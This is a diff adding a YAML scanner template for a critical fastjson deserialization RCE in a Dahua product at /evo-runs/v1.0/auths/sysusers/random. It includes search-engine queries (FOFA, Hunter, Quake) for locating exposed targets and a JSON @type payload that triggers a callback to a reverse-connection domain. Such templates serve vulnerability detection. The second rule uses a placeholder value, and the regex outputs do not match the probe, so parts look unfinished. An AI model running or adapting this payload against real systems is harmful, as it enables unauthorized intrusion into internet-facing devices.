@@ -1,0 +1,68 @@
+name: dahua-wulian-random-rce
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: body="*客户端会小于800*"
+    hunter-query: web.body="*客户端会小于800*"
+    quake-query: body="*客户端会小于800*"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    tips: fastjson
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()  # 结果表达式写 reverse.wait(5)
+    reverseURL: reverse.url # http://xxx
+    reverseRMI: reverse.rmi # rmi://xx 
+    requestURL: request.url # 目标url http://xx
+    reverseDM: reverse.domain  # 反连域名,必须配好域名才能使用，不然会报错
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("")
+    # m5: md5(string(requestURL))) m5 不调用的话，就会报错运行不起来
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /evo-runs/v1.0/auths/sysusers/random
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+      body: "{\r\n    \"a\":{\r\n        \"@type\":\"com.alibaba.fastjson.JSONObject\",\r\n        {\"@type\":\"java.net.URL\",\"val\":\"{{reverseDM}}\"}\r\n        }\"\"\r\n}"
+      
+    expression: reverse.wait(5) #调用reverseURL就好 
+
+    output:
+      search: '"(?P<re_file>\\w+.jsp)".bsubmatch(response.body)'
+      re_file: search["re_file"]          
+      search1: '"resourceUuid\":\"(?P<re_dir>.+?)\",\"resourceType".bsubmatch(response.body)' 
+      re_dir: search1["re_dir"]            
+
+  r1:
+    request:
+      method: POST
+      path: /evo-runs/v1.0/auths/sysusers/random
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+      body: "{\r\n    \"a\":{\r\n        \"@type\":\"com.alibaba.fastjson.JSONObject\",\r\n        {\"@type\":\"java.net.URL\",\"val\":\"xxx\"}\r\n        }\"\"\r\n}"
+
+    expression: reverse.wait(5) #调用reverseURL就好 
+    
+expression: r0() 
